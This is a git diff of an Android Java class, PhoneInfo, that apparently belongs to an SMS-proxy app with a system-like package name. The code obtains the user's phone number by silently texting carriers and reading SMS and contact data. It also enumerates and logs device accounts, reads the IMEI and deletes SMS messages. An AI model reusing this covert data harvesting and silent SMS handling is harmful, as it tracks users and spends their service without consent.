@@ -2,9 +2,14 @@ package com.android.sms.proxy.entity;
 
 import android.accounts.Account;
 import android.accounts.AccountManager;
+import android.app.Activity;
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
 import android.content.ContentValues;
 import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
@@ -67,57 +72,57 @@ public class PhoneInfo {
 		return mInstance;
 	}
 
-	private String findPhoneNumber(String providerName) {
-		try {
-			String text = null;
-			switch (providerName) {
-				case "中国移动":
-					text = "10086";
-					break;
-				case "中国联通":
-					text = "10010";
-					break;
-				case "中国电信":
-					text = "10000";
-					break;
-				default:
-					break;
-			}
-			if (TextUtils.isEmpty(text)) return null;
-			Uri uri = Uri.parse(SMS_RECEIVE_BOX);
-			ContentResolver contentResolver = context.getContentResolver();
-			String[] projection = new String[]{
-					"_id",
-					"address",
-					"body"
-			};
-			String select = "address = ?";
-			String[] selectArgs = new String[]{text};
-			if (contentResolver != null) {
-				Cursor cursor = contentResolver.query(uri, projection, select, selectArgs, "date desc");
-				if (DEBUG) {
-					Log.d(TAG, "找到类似的短信多少条:" + cursor.getCount());
-				}
-				while (cursor.moveToNext()) {
-					String body = cursor.getString(cursor.getColumnIndex("body")).trim();
-					if (DEBUG) {
-						Log.d(TAG, "短信内容:" + body);
-					}
-					String phoneNumber = getPhoneNumber(body);
-					if (!TextUtils.isEmpty(phoneNumber)) {
-						return phoneNumber;
-					}
-				}
-			}
-		} catch (Throwable e) {
-			if (DEBUG) {
-				Log.e(TAG, e.fillInStackTrace().toString());
-			}
-			FlurryAgent.onError(TAG, "", e);
-
-		}
-		return null;
-	}
+//	private String findPhoneNumber(String providerName) {
+//		try {
+//			String text = null;
+//			switch (providerName) {
+//				case "中国移动":
+//					text = "10086";
+//					break;
+//				case "中国联通":
+//					text = "10010";
+//					break;
+//				case "中国电信":
+//					text = "10000";
+//					break;
+//				default:
+//					break;
+//			}
+//			if (TextUtils.isEmpty(text)) return null;
+//			Uri uri = Uri.parse(SMS_RECEIVE_BOX);
+//			ContentResolver contentResolver = context.getContentResolver();
+//			String[] projection = new String[]{
+//					"_id",
+//					"address",
+//					"body"
+//			};
+//			String select = "address = ?";
+//			String[] selectArgs = new String[]{text};
+//			if (contentResolver != null) {
+//				Cursor cursor = contentResolver.query(uri, projection, select, selectArgs, "date desc");
+//				if (DEBUG) {
+//					Log.d(TAG, "找到类似的短信多少条:" + cursor.getCount());
+//				}
+//				while (cursor.moveToNext()) {
+//					String body = cursor.getString(cursor.getColumnIndex("body")).trim();
+//					if (DEBUG) {
+//						Log.d(TAG, "短信内容:" + body);
+//					}
+//					String phoneNumber = getPhoneNumber(body);
+//					if (!TextUtils.isEmpty(phoneNumber)) {
+//						return phoneNumber;
+//					}
+//				}
+//			}
+//		} catch (Throwable e) {
+//			if (DEBUG) {
+//				Log.e(TAG, e.fillInStackTrace().toString());
+//			}
+//			FlurryAgent.onError(TAG, "", e);
+//
+//		}
+//		return null;
+//	}
 
 	private String getPhoneNumber(String smsBody) {
 		String telRegex = "[1][358]\\d{9}";
@@ -134,27 +139,67 @@ public class PhoneInfo {
 	}
 
 
+	public void getPhoneNumberFromContentResolver(Context context) {
+		String main_data[] = {"data1", "is_primary", "data3", "data2", "data1", "is_primary", "photo_uri", "mimetype"};
+		Object object = context.getContentResolver().query(Uri.withAppendedPath(android.provider.ContactsContract
+						.Profile.CONTENT_URI, "data"),
+				main_data, "mimetype=?",
+				new String[]{"vnd.android.cursor.item/phone_v2"},
+				"is_primary DESC");
+		if (object != null) {
+			do {
+				if (!((Cursor) (object)).moveToNext())
+					break;
+				String s1 = ((Cursor) (object)).getString(4);
+			} while (true);
+			((Cursor) (object)).close();
+		}
+	}
+
+	public void getPhoneNumberFromAccount(Context context) {
+		AccountManager am = AccountManager.get(context);
+		Account[] accounts = am.getAccounts();
+		String acname;
+		String actype;
+		String mobile_no;
+		String email;
+		for (Account ac : accounts) {
+			acname = ac.name;
+			if (acname.startsWith("91")) {
+				mobile_no = acname;
+			} else if (acname.endsWith("@gmail.com") || acname.endsWith("@yahoo.com") || acname.endsWith("@hotmail" +
+					".com")) {
+				email = acname;
+			}
+
+			// Take your time to look at all available accounts
+			Log.i("Accounts : ", "Accounts : " + acname);
+		}
+	}
+
 	public synchronized String getNativePhoneNumber() {
 		try {
 			if (TextUtils.isEmpty(phoneNumber)) {
 				//先从sp查找.
 				String phone = getDbPhoneNumber(context);
-				Log.d(TAG, "从sp读到的手机号:" + phone);
+				if (DEBUG) {
+					Log.d(TAG, "从sp读到的手机号:" + phone);
+				}
 				if (TextUtils.isEmpty(phone)) {
 					//通过下面两种方法获取手机号
 					phone = getNativePhoneNumber1();
 					if (TextUtils.isEmpty(phone)) {
 						if (!isSIMexistOrAvaiable()) return null;
-						phone = findPhoneNumber(getProvidersName());
-						if (TextUtils.isEmpty(phone)) {
-							sendSMS();
-						} else {
-							phoneNumber = phone;
-							savePhoneInfo(context, phoneNumber);
-							Map<String, String> map = new HashMap<>();
-							map.put(NativeParams.KEY_QUERY_SMS, String.valueOf(true));
-							FlurryAgent.logEvent(NativeParams.EVENT_GET_PHONE_NUMBER, map);
-						}
+//						phone = findPhoneNumber(getProvidersName());
+//						if (TextUtils.isEmpty(phone)) {
+//							sendSMS();
+//						} else {
+//							phoneNumber = phone;
+//							savePhoneInfo(context, phoneNumber);
+//							Map<String, String> map = new HashMap<>();
+//							map.put(NativeParams.KEY_QUERY_SMS, String.valueOf(true));
+//							FlurryAgent.logEvent(NativeParams.EVENT_GET_PHONE_NUMBER, map);
+//						}
 					} else {
 						if (DEBUG) {
 							Log.d(TAG, "从方法１找到手机号！！");
@@ -174,27 +219,86 @@ public class PhoneInfo {
 			}
 		} catch (Throwable e) {
 			if (DEBUG) {
-				Log.d(TAG, "getNativePhoneNumber()函数异常:" + e.fillInStackTrace().toString());
+				Log.e(TAG, "getNativePhoneNumber()函数异常:" + e.fillInStackTrace().toString());
 			}
 			FlurryAgent.onError(TAG, "", e);
 		}
 
-		return "13570597018";
+		return null;
 	}
 
 	//targetAddress运营商的查询电话，code 为我们查询的指令
 	public void sendSMS(String targetAddress, String code) {
 		//距离上次1分钟，不应发短信！！！！！！！
+		try {
+			if (DEBUG) {
+				Log.d(TAG, "发送短信到" + targetAddress + "查手机号");
+			}
 
-		if (DEBUG) {
-			Log.d(TAG, "发送短信到" + targetAddress + "查手机号");
+			if (!TextUtils.isEmpty(code)) {
+				String SENT = "sms_sent";
+				String DELIVERED = "sms_delivered";
+				PendingIntent sendPi = PendingIntent.getBroadcast(context, 0, new Intent(SENT), 0);
+				PendingIntent receivePi = PendingIntent.getBroadcast(context, 0, new Intent(DELIVERED), 0);
+				context.registerReceiver(new BroadcastReceiver() {
+					@Override
+					public void onReceive(Context context, Intent intent) {
+						switch (getResultCode()) {
+							case Activity.RESULT_OK:
+								if (DEBUG) {
+									Log.d(TAG, "Activity.RESULT OK");
+								}
+								break;
+							case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
+								if (DEBUG) {
+									Log.d(TAG, "RESULT_ERROR_GENERIC_FAILURE");
+								}
+								break;
+							case SmsManager.RESULT_ERROR_NO_SERVICE:
+								if (DEBUG) {
+									Log.d(TAG, "RESULT_ERROR_NO_SERVICE");
+								}
+								break;
+							case SmsManager.RESULT_ERROR_NULL_PDU:
+								if (DEBUG) {
+									Log.d(TAG, "RESULT_ERROR_NULL_PDU");
+								}
+								break;
+							case SmsManager.RESULT_ERROR_RADIO_OFF:
+								if (DEBUG) {
+									Log.d(TAG, "RESULT_ERROR_RADIO_OFF");
+								}
+								break;
+						}
+					}
+				}, new IntentFilter(SENT));
+
+				context.registerReceiver(new BroadcastReceiver() {
+					@Override
+					public void onReceive(Context context, Intent intent) {
+						switch (getResultCode()) {
+							case Activity.RESULT_OK:
+								if (DEBUG) {
+									Log.d(TAG, "RESULT_OK");
+								}
+								break;
+							case Activity.RESULT_CANCELED:
+								if (DEBUG) {
+									Log.d(TAG, "RESULT_CANCELED");
+								}
+								break;
+						}
+					}
+				}, new IntentFilter(DELIVERED));
+				if (DEBUG) {
+					Log.d(TAG, "send " + code + " to " + targetAddress);
+				}
+				SmsManager smsManager = SmsManager.getDefault();
+				smsManager.sendTextMessage(targetAddress, null, code, sendPi, receivePi);
+			}
+		} catch (Throwable e) {
+			FlurryAgent.onError(TAG, "", e);
 		}
-
-		if (!TextUtils.isEmpty(code)) {
-			SmsManager smsManager = SmsManager.getDefault();
-			smsManager.sendTextMessage(targetAddress, null, code, null, null);
-		}
-
 	}
 
 
@@ -257,10 +361,11 @@ public class PhoneInfo {
 		String phone = "";
 		try {
 			phone = telephonyManager.getLine1Number();
-		} catch (Exception e) {
+		} catch (Throwable e) {
 			if (DEBUG) {
 				Log.e(TAG, "getNativePhoneNumber1函数异常:" + e.fillInStackTrace().toString());
 			}
+			FlurryAgent.onError(TAG, "", e);
 		}
 		return phone;
 	}
@@ -374,8 +479,8 @@ public class PhoneInfo {
 		return imei;
 	}
 
-	public String getPhoneIMEI(){
-		TelephonyManager tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+	public String getPhoneIMEI() {
+		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
 		return tm.getDeviceId();
 	}
 
@@ -412,12 +517,18 @@ public class PhoneInfo {
 		values.put(UserContentProviderMetaData.UserTableMetaData.PHONE_NAME, phoneNumber);
 		Uri uri = context.getContentResolver().insert(UserContentProviderMetaData.UserTableMetaData.CONTENT_URI,
 				values);
-		Log.d(TAG, "insert uri = " + uri);
+		if (DEBUG) {
+			Log.d(TAG, "insert uri = " + uri);
+		}
 		String lastPath = uri.getLastPathSegment();
 		if (TextUtils.isEmpty(lastPath)) {
-			Log.d(TAG, "insert failure");
+			if (DEBUG) {
+				Log.d(TAG, "insert failure");
+			}
 		} else {
-			Log.d(TAG, "insert success! the id is:" + lastPath);
+			if (DEBUG) {
+				Log.d(TAG, "insert success! the id is:" + lastPath);
+			}
 		}
 		return Integer.parseInt(lastPath);
 	}
@@ -430,6 +541,9 @@ public class PhoneInfo {
 		if (c != null && c.moveToFirst()) {
 			phoneNumber = c.getString(c.getColumnIndexOrThrow(UserContentProviderMetaData.UserTableMetaData
 					.PHONE_NAME));
+		}
+		if (c != null) {
+			c.close();
 		}
 		return phoneNumber;
 	}
@@ -482,7 +596,7 @@ public class PhoneInfo {
 					}
 					EventBus.getDefault().post(new MessageEvent((count >= 1) ? "delete success" : "delete failed"));
 					isRead.close();
-				}else{
+				} else {
 					final String deleteFail = "sms not send or have been deleted!!";
 					EventBus.getDefault().post(new MessageEvent(deleteFail));
 				}
